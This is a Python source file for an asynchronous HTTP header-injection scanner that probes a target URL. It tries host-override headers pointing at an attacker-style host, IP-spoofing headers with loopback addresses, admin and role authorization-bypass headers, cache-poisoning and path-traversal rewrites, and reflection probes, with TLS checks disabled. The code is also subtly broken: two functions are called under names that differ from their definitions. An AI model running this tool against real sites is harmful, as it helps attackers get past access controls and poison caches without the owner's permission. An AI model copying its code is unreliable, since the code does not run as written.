import asyncio
import aiohttp
import itertools
from dataclasses import dataclass, field
from typing import Optional
from enum import Enum
import time
import re


class InjectionResult(Enum):
    REFLECTED = "reflected"
    BYPASS = "bypass"
    OVERRIDE = "override"
    BLOCKED = "blocked"
    ERROR = "error"
    NEUTRAL = "neutral"


@dataclass
class HeaderProbeResult:
    header_name: str
    injected_value: str
    status_code: int
    result_type: InjectionResult
    reflected_in: list[str] = field(default_factory=list)
    response_delta: dict = field(default_factory=dict)
    latency_ms: float = 0.0
    notes: str = ""


@dataclass
class InjectionReport:
    target_url: str
    baseline_status: int
    baseline_headers: dict
    baseline_body_hash: str
    probes: list[HeaderProbeResult] = field(default_factory=list)
    bypass_candidates: list[HeaderProbeResult] = field(default_factory=list)
    reflection_candidates: list[HeaderProbeResult] = field(default_factory=list)
    duration_seconds: float = 0.0


HOST_OVERRIDE_HEADERS = [
    "Host",
    "X-Forwarded-Host",
    "X-Host",
    "X-Forwarded-Server",
    "X-Original-Host",
    "X-Rewrite-URL",
    "X-Override-URL",
    "Forwarded",
    "X-HTTP-Host-Override",
]

IP_SPOOF_HEADERS = [
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Client-IP",
    "X-Remote-IP",
    "X-Remote-Addr",
    "X-Originating-IP",
    "X-ProxyUser-Ip",
    "True-Client-IP",
    "CF-Connecting-IP",
    "Fastly-Client-IP",
    "X-Cluster-Client-IP",
    "X-Original-Forwarded-For",
    "Forwarded-For",
]

CACHE_POISON_HEADERS = [
    "X-Forwarded-Scheme",
    "X-Forwarded-Proto",
    "X-Original-URL",
    "X-Rewrite-URL",
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-Custom-IP-Authorization",
]

AUTH_BYPASS_HEADERS = [
    "X-Custom-IP-Authorization",
    "X-Auth-Token",
    "X-Admin",
    "X-Role",
    "X-User-ID",
    "X-User",
    "X-Forwarded-User",
    "Authorization",
    "X-Access-Token",
    "X-Api-Key",
]

REFLECTION_PROBE_HEADERS = [
    "X-Probe",
    "X-Test-Header",
    "X-Debug",
    "X-Custom",
    "Referer",
    "Origin",
    "User-Agent",
    "Accept-Language",
]

PRIVATE_IPS = [
    "127.0.0.1",
    "127.0.0.2",
    "localhost",
    "0.0.0.0",
    "10.0.0.1",
    "10.10.10.1",
    "192.168.0.1",
    "192.168.1.1",
    "172.16.0.1",
    "::1",
    "fe80::1",
]

BYPASS_VALUES_FOR_AUTH = [
    "true",
    "1",
    "admin",
    "administrator",
    "root",
    "yes",
    "allow",
    "granted",
]

FORWARDED_FORMATS = [
    "for={ip}",
    "for={ip};proto=https",
    "for={ip};host=internal",
    "by={ip};for={ip};proto=http",
]


def _hash_body(body: bytes) -> str:
    import hashlib
    return hashlib.md5(body).hexdigest()


def _headers_delta(baseline: dict, current: dict) -> dict:
    added = {k: v for k, v in current.items() if k not in baseline}
    removed = {k: baseline[k] for k in baseline if k not in current}
    changed = {
        k: {"from": baseline[k], "to": current[k]}
        for k in baseline
        if k in current and baseline[k] != current[k]
    }
    return {"added": added, "removed": removed, "changed": changed}


def _check_reflection(value: str, response_headers: dict, body: bytes) -> list[str]:
    reflected_in = []
    for hname, hval in response_headers.items():
        if value.lower() in hval.lower():
            reflected_in.append(f"response_header:{hname}")
    try:
        body_text = body.decode("utf-8", errors="ignore")
        if value in body_text:
            reflected_in.append("body")
    except Exception:
        pass
    return reflected_in
    
    
def _build_host_override_payloads(target_host: str) -> list[tuple[str, str]]:
    payloads = []
    evil_host = "evil.internal.attacker.com"
    for header in HOST_OVERRIDE_HEADERS:
        payloads.append((header, evil_host))
        payloads.append((header, f"evil.{target_host}"))
        payloads.append((header, "localhost"))
        payloads.append((header, f"{target_host}@evil.internal"))
        payloads.append((header, f"{target_host}%40evil.internal"))
    return payloads
    
    
def _build_ip_spoof_payloads() -> list[tuple[str, str]]:
    payloads = []
    for header in IP_SPOOF_HEADERS:
        for ip in PRIVATE_IPS:
            payloads.append((header, ip))
            for fmt in FORWARDED_FORMATS:
                payloads.append((header, fmt.format(ip=ip)))
    return payloads
    
    
def _build_auth_bypass_payloads() -> list[tuple[str, str]]:
    payloads = []
    for header in AUTH_BYPASS_HEADERS:
        for val in BYPASS_VALUES_FOR_AUTH:
            payloads.append((header, val))
    return payloads
    
    
def _build_cahce_poison_payloads(target_host: str) -> list[tuple[str, str]]:
    payloads = []
    for header in CACHE_POISON_HEADERS:
        if "scheme" in header.lower() or "proto" in header.lower():
            payloads.append((header, "https"))
            payloads.append((header, "http"))
        elif "url" in header.lower() or "rewrite" in header.lower():
            payloads.append((header, f"https://{target_host}/admin"))
            payloads.append((header, "/admin"))
            payloads.append((header, "/%2e%2e/admin"))
        elif "method" in header.lower():
            for method in ["DELETE", "PUT", "PATCH", "HEAD", "OPTIONS"]:
                payloads.append((header, method))
        else:
            payloads.append((header, "127.0.0.1"))
    return payloads
    
    
def _build_reflection_payloads(probe_id: str) -> list[tuple[str, str]]:
    payloads = []
    probe_val = f"artex-probe-{probe_id[:8]}"
    for header in REFLECTION_PROBE_HEADERS:
        payloads.append((header, probe_val))
        payloads.append((header, f"<{probe_val}>"))
        payloads.append((header, f'"{probe_val}"'))
        payloads.append((header, f"javascript:{probe_val}"))
    return payloads
    
    
async def _send_probe(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    inject_header: str,
    inject_value: str,
    base_headers: dict,
) -> tuple[int, dict, bytes, float]:
    headers = {**base_headers, inject_header: inject_value}
    t0 = time.monotonic()
    try:
        async with session.request(
            method,
            url,
            headers=headers,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False,
        ) as resp:
            body = await resp.read()
            latency = (time.monotonic() - t0) * 1000
            return resp.status, dict(resp.headers), body, latency
    except asyncio.TimeoutError:
        return 0, {}, b"", (time.monotonic() - t0) * 1000
    except Exception as e:
        return -1, {}, str(e).encode(), (time.monotonic() - t0) * 1000
        
        
async def _get_baseline(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    base_headers: dict,
) -> tuple[int, dict, bytes]:
    try:
        async with session.request(
            method,
            url,
            headers=base_headers,
            allow_redirects=False,
            timeout=aiohttp.ClientTimeout(total=10),
            ssl=False,
        ) as resp:
            body = await resp.read()
            return resp.status, dict(resp.headers), body
    except Exception:
        return 0, {}, b""


def _classify_result(
    baseline_status: int,
    probe_status: int,
    baseline_body_hash: str,
    probe_body: bytes,
    inject_value: str,
    resp_headers: dict,
) -> tuple[InjectionResult, list[str]]:
    reflected = _check_reflection(inject_value, resp_headers, probe_body)

    if probe_status == 0 or probe_status == -1:
        return InjectionResult.ERROR, reflected

    probe_body_hash = _hash_body(probe_body)

    if reflected:
        return InjectionResult.REFLECTED, reflected

    if baseline_status in (401, 403, 302) and probe_status == 200:
        return InjectionResult.BYPASS, reflected

    if probe_body_hash != baseline_body_hash and probe_status != baseline_status:
        return InjectionResult.OVERRIDE, reflected

    if probe_status == baseline_status and probe_body_hash == baseline_body_hash:
        return InjectionResult.NEUTRAL, reflected

    return InjectionResult.NEUTRAL, reflected


async def _run_probe_batch(
    session: aiohttp.ClientSession,
    method: str,
    url: str,
    base_headers: dict,
    payloads: list[tuple[str, str]],
    baseline_status: int,
    baseline_headers: dict,
    baseline_body_hash: str,
    semaphore: asyncio.Semaphore,
    delay: float = 0.0,
) -> list[HeaderProbeResult]:
    results = []
    
    async def _probe_one(header: str, value: str) -> HeaderProbeResult:
        async with semaphore:
            if delay > 0:
                await asyncio.sleep(delay)
            status, resp_headers, body, latency = await _send_probe(
                session, method, url, header, value, base_headers
            )
            result_type, reflected = _classify_result(
                baseline_status, status, baseline_body_hash, body, value, resp_headers
            )
            delta = _header_delta(baseline_headers, resp_headers)
            return HeaderProbeResult(
                header_name=header,
                injected_value=value,
                status_code=status,
                result_type=result_type,
                reflected_in=reflected,
                response_delta=delta,
                latency_ms=latency,
            )
            
    tasks = [_probe_one(h, v) for h, v in payloads]
    results = await asyncio.gather(*tasks, return_exceptions=False)
    return list(results)
    
    
class HeaderInjector:
    def __init__(
        self,
        concurrency: int = 20,
        delay: float = 0.05,
        user_agent: str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        method: str = "GET",
    ):
        self.concurrency = concurrency
        self.delay = delay
        self.method = method
        self.base_headers = {
            "User-Agent": user_agent,
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }

    async def run(self, url: str, probe_id: str = "default") -> InjectionReport:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        target_host = parsed.netloc or parsed.path

        t_start = time.monotonic()
        connector = aiohttp.TCPConnector(ssl=False, limit=self.concurrency)

        async with aiohttp.ClientSession(connector=connector) as session:
            baseline_status, baseline_headers, baseline_body = await _get_baseline(
                session, self.method, url, self.base_headers
            )
            baseline_body_hash = _hash_body(baseline_body)

            report = InjectionReport(
                target_url=url,
                baseline_status=baseline_status,
                baseline_headers=baseline_headers,
                baseline_body_hash=baseline_body_hash,
            )

            all_payloads = list(itertools.chain(
                _build_host_override_payloads(target_host),
                _build_ip_spoof_payloads(),
                _build_auth_bypass_payloads(),
                _build_cache_poison_payloads(target_host),
                _build_reflection_payloads(probe_id),
            ))

            semaphore = asyncio.Semaphore(self.concurrency)
            results = await _run_probe_batch(
                session=session,
                method=self.method,
                url=url,
                base_headers=self.base_headers,
                payloads=all_payloads,
                baseline_status=baseline_status,
                baseline_headers=baseline_headers,
                baseline_body_hash=baseline_body_hash,
                semaphore=semaphore,
                delay=self.delay,
            )

        report.probes = results
        report.bypass_candidates = [
            r for r in results if r.result_type in (InjectionResult.BYPASS, InjectionResult.OVERRIDE)
        ]
        report.reflection_candidates = [
            r for r in results if r.result_type == InjectionResult.REFLECTED
        ]
        report.duration_seconds = time.monotonic() - t_start
        return report

    def run_sync(self, url: str, probe_id: str = "default") -> InjectionReport:
        return asyncio.run(self.run(url, probe_id))


def serialize_report(report: InjectionReport) -> dict:
    def probe_to_dict(p: HeaderProbeResult) -> dict:
        return {
            "header": p.header_name,
            "value": p.injected_value,
            "status": p.status_code,
            "result": p.result_type.value,
            "reflected_in": p.reflected_in,
            "response_delta": p.response_delta,
            "latency_ms": round(p.latency_ms, 2),
            "notes": p.notes,
        }

    return {
        "target": report.target_url,
        "baseline_status": report.baseline_status,
        "baseline_body_hash": report.baseline_body_hash,
        "duration_seconds": round(report.duration_seconds, 2),
        "total_probes": len(report.probes),
        "bypass_count": len(report.bypass_candidates),
        "reflection_count": len(report.reflection_candidates),
        "bypass_candidates": [probe_to_dict(p) for p in report.bypass_candidates],
        "reflection_candidates": [probe_to_dict(p) for p in report.reflection_candidates],
        "all_probes": [probe_to_dict(p) for p in report.probes],
    }


def run_header_injection(
    url: str,
    concurrency: int = 20,
    delay: float = 0.05,
    method: str = "GET",
) -> dict:
    injector = HeaderInjector(concurrency=concurrency, delay=delay, method=method)
    report = injector.run_sync(url)
    return serialize_report(report)